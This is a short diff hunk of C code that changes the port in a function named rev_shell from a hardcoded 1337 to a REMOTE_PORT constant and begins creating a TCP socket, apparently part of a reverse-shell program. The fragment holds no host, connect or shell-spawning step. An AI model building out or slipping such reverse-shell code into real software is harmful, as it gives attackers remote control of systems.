@@ -23,7 +23,7 @@
 
 
 void *rev_shell(void){
-  int port = 1337;
+  int port = REMOTE_PORT;
   struct sockaddr_in revsockaddr;
 
   int sockt = socket(AF_INET, SOCK_STREAM, 0);
